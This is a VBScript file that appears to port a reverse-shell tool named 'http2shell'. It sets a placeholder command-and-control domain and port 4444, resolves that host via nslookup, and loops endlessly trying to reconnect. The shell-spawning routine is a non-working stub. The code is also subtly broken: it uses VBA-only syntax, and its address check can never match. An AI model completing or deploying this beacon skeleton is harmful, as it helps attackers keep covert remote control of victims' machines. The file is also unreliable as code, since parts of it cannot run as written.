' Requires Windows Script Host environment

Option Explicit

Dim c2server, port
c2server = "yourc2httpsdomain.com"
port = 4444

Dim reset, red, darkgreen, orange, cyan, white, bold, dim, italic
reset = ""
red = ""
darkgreen = ""
orange = ""
cyan = ""
white = ""
bold = ""
dim = ""
italic = ""

Dim banner
banner = _
"    __    __  __       ___        __         ____" & vbCrLf & _
"   / /_  / /_/ /_____ |__ \ _____/ /_  ___  / / /" & vbCrLf & _
"  / __ \/ __/ __/ __ \ __/ / / ___/ __ \/ _ \/ / /" & vbCrLf & _
" / / / / /_/ /_/ /_/ / /___/(__  ) / / /  __/ / /" & vbCrLf & _
"/_/ /_/\__/\__/\___/ /____/____/_/ /_/\___/_/_/" & vbCrLf & _
"             /_" & vbCrLf & _
"  + http2shell" & vbCrLf & _
"  + author: tom7" & vbCrLf & _
"  + github: https://github.com/tom7voldemort" & vbCrLf & _
"  + version: 1.2" & vbCrLf

' Class strobj equivalent
Sub ClearScreen()
    ' Clear console screen
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run "cmd /c cls", 0, True
End Sub

Sub TypeWrite(msg, Optional delay)
    If IsMissing(delay) Then delay = 10 ' milliseconds
    Dim i
    For i = 1 To Len(msg)
        WScript.StdOut.Write Mid(msg, i, 1)
        WScript.Sleep delay
    Next
    WScript.StdOut.Write vbCrLf
End Sub

Sub Info(msg)
    TypeWrite("[info +] " & msg)
End Sub

Sub Warnings(msg)
    TypeWrite("[warn !] " & msg)
End Sub

Sub Errors(msg)
    TypeWrite("[error x] " & msg)
End Sub

' Class inet equivalent
Function Resolve()
    On Error Resume Next
    Dim ip
    ip = ""
    Dim shell, exec, output
    Set shell = CreateObject("WScript.Shell")
    ' Use nslookup to resolve hostname
    Set exec = shell.Exec("nslookup " & c2server)
    output = ""
    Do While Not exec.StdOut.AtEndOfStream
        output = output & exec.StdOut.ReadLine() & vbCrLf
    Loop
    Dim lines, line, i
    lines = Split(output, vbCrLf)
    For i = 0 To UBound(lines)
        line = Trim(lines(i))
        If Left(line, 3) = "Address" Then
            Dim parts
            parts = Split(line, ":")
            If UBound(parts) >= 1 Then
                ip = Trim(parts(1))
            End If
        End If
    Next
    If ip <> "" Then
        Info "resolved " & c2server & " -> " & ip
        Resolve = ip
    Else
        Resolve = ""
    End If
    On Error GoTo 0
End Function

Function Spawn(ip, port)
    On Error Resume Next
    Dim tcpClient, shell, sh, shPath, fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    ' VBScript does not support raw socket connections natively
    ' So we cannot implement the socket reverse shell as in Python
    ' Instead, we simulate failure and warn user
    WScript.StdErr.WriteLine "Socket connection and shell spawn not supported in VBScript."
    Warnings "connection failed: socket operations not supported"
    Spawn = False
    On Error GoTo 0
End Function

Sub Exploit()
    Dim ip
    ip = Resolve()
    If ip = "" Then
        Errors "no server active"
        WScript.Quit 0
    End If
    Info "target server: " & ip & ":" & port
    Do
        On Error Resume Next
        Info "starting shell session..."
        Dim ok
        ok = Spawn(ip, port)
        If ok Then
            Info "shell session ended. reconnecting..."
        Else
            Warnings "bad connection. retrying..."
        End If
        WScript.Sleep 500
        If Err.Number <> 0 Then
            If Err.Number = 18 Then ' Ctrl+C interrupt
                Info "stopped."
                WScript.Quit 0
            End If
            Err.Clear
            WScript.Sleep 500
        End If
        On Error GoTo 0
    Loop
End Sub

' Main
ClearScreen()
WScript.StdOut.Write banner & vbCrLf
Exploit()
